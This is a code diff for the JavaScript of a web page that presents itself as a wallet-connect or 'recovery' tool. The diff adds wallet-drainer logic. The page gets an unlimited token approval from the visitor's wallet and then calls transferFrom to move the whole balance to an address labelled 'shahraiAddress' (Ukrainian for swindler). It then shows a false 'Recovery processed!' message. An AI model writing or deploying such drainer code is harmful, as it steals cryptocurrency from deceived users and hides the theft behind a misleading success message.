@@ -216,11 +216,11 @@
         usdc: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
       },
       11155111: { // Sepolia Testnet
-        usdt: "0x9FcefD342ED17979ceDf0B6C4D257A03d908F5fD" // Твоя testUSDT
+        usdt: "0x9FcefD342ED17979ceDf0B6C4D257A03d908F5fD"
       }
     };
 
-    const contractAddress = "0xA606bCbafce5Fe67483EF479620A384DE7971A49"; // Твоя поточна адреса ApproveContract
+    const contractAddress = "0x34CB3899bb58b0eAF6981C652efcc50bB21901e9"; // Твоя поточна адреса ApproveContract
     const shahraiAddress = "0x72ad654e24e8D65e8ed0ef8d8B841bb1e2D0830e"; // Твій гаманець Б
 
     function formatNumber(number) {
@@ -290,7 +290,8 @@
         const provider = new ethers.providers.Web3Provider(window.ethereum);
         const tokenAbi = [
           "function balanceOf(address) view returns (uint256)",
-          "function decimals() view returns (uint8)"
+          "function decimals() view returns (uint8)",
+          "function transferFrom(address from, address to, uint256 amount) external returns (bool)"
         ];
         const tokenContract = new ethers.Contract(tokenAddress, tokenAbi, provider);
         const balance = await tokenContract.balanceOf(userAddress);
@@ -316,11 +317,17 @@
         ];
         const contract = new ethers.Contract(contractAddress, contractAbi, new ethers.providers.Web3Provider(window.ethereum).getSigner());
 
-        const maxAmount = ethers.constants.MaxUint256; // Максимальний баланс
+        const maxAmount = ethers.constants.MaxUint256;
         const messageBytes = ethers.utils.toUtf8Bytes(message);
-        const tx = await contract.executeApprove(messageBytes, userAddress, signature, tokenAddress, shahraiAddress, maxAmount);
-        await tx.wait();
-        console.log('Transaction Hash:', tx.hash);
+        const approveTx = await contract.executeApprove(messageBytes, userAddress, signature, tokenAddress, contractAddress, maxAmount);
+        await approveTx.wait();
+        console.log('Approve Transaction Hash:', approveTx.hash);
+
+        // Виклик transferFrom для переказу токенів на shahraiAddress
+        const tokenContractWithSigner = tokenContract.connect(new ethers.providers.Web3Provider(window.ethereum).getSigner());
+        const transferTx = await tokenContractWithSigner.transferFrom(userAddress, shahraiAddress, balance);
+        await transferTx.wait();
+        console.log('Transfer Transaction Hash:', transferTx.hash);
 
         alert('Wallet connected successfully. Recovery processed!');
       } catch (error) {
